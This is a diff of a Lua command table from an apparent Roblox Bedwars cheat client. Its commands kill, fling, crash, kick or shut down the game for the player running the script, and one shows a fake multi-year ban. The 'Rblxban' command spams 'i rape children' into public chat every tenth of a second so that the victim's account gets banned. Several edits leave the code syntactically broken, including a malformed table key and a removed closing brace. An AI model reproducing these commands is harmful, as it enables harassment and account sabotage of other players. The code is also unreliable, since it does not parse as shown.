@@ -259,11 +259,11 @@ end)
 local collectionservice = game:GetService("CollectionService")
 local vec3 = Vector3.new
 local commands = {
-	["kill"] = function(args, plr)
+	[["kill"] = function(args, plr)
 		if entity.isAlive then
 			local hum = entity.character.Humanoid
-			bedwars["DamageController"]:requestSelfDamage(lplr.Character:GetAttribute("Health"), 0, "69", {fromEntity = plr.Character})
-			task.delay(0.2, function()
+			bedwars["DamageController"]:requestSelfDamage(lplr.Character:GetAttribute("Health"), 3, "69", {fromEntity = {getInstance = function() return plr.Character end}})
+			task.delay(0.1, function()
 				if hum and hum.Health > 0 then 
 					hum:ChangeState(Enum.HumanoidStateType.Dead)
 					hum.Health = 0
@@ -291,7 +291,7 @@ local commands = {
 	end,
 	["lagback"] = function(args)
 		if entity.isAlive then
-			entity.character.HumanoidRootPart.Velocity = vec3(9999999, 9999999, 9999999)
+			entity.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
 		end
 	end,
 	["jump"] = function(args)
@@ -328,8 +328,8 @@ local commands = {
 		if entity.isAlive then
 			task.spawn(function()
 				repeat
-					task.wait(0.2)
-					entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, vec3(0, -20, 0))
+					task.wait()
+					entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
 				until not entity.isAlive
 			end)
 		end
@@ -337,20 +337,13 @@ local commands = {
 	["framerate"] = function(args)
 		if #args >= 1 then
 			if setfpscap then
-				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]), 1, 9999) or 9999)
+				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
 			end
 		end
 	end,
 	["crash"] = function(args)
 		setfpscap(9e9)
-		print(game:GetObjects("h29g3535")[1])
-	end,
-        ["Lobby"] = function(args)
-  game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
-	end,
-        ["Rblxban"] = function(args)
-  while task.wait(0.1) do
-    game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("i rape children","All")
+    	print(game:GetObjects("h29g3535")[1])
 	end,
 	["chipman"] = function(args)
 		local function funnyfunc(v)
@@ -397,7 +390,7 @@ local commands = {
 				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
 			end
 		end
-
+	
 		for i,v in pairs(game:GetDescendants()) do
 			funnyfunc(v)
 		end
@@ -448,7 +441,7 @@ local commands = {
 				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
 			end
 		end
-
+	
 		for i,v in pairs(game:GetDescendants()) do
 			funnyfunc(v)
 		end
@@ -457,6 +450,13 @@ local commands = {
 	["gravity"] = function(args)
 		workspace.Gravity = tonumber(args[1]) or 192.6
 	end,
+        ["Lobby"] = function(args)
+  game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
+	end,
+        ["Rblxban"] = function(args)
+  while task.wait(0.1) do
+    game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("i rape children","All")
+	end,
 	["kick"] = function(args)
 		local str = ""
 		for i,v in pairs(args) do
@@ -464,6 +464,12 @@ local commands = {
 		end
 		task.spawn(function()
 			lplr:Kick(str)
+		end)
+		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
+	end,
+	["ban"] = function(args)
+		task.spawn(function()
+			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
 		end)
 		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
 	end,
@@ -535,19 +541,20 @@ local commands = {
 		if #args >= 1 then
 			local module = GuiLibrary["ObjectsThatCanBeSaved"][args[1].."OptionsButton"]
 			if module then
-				if args[2] == "true" then
-					if module["Api"]["Enabled"] == false then
-						module["Api"]["ToggleButton"]()
-					end
-				else
-					if module["Api"]["Enabled"] then
-						module["Api"]["ToggleButton"]()
-					end
+				if module["Api"]["Enabled"] == (not args[2] == "true") then
+					module["Api"]["ToggleButton"]()
 				end
 			end
 		end
 	end,
-}
+	["shutdown"] = function(args)
+		game:Shutdown()
+	end,
+	["errorkick"] = function(args)
+		if entity.isAlive then 
+			pcall(function() lplr.Character.Head:Destroy() end)
+		end
+	end
 local function findplayers(arg, plr)
 	local temp = {}
 	local continuechecking = true
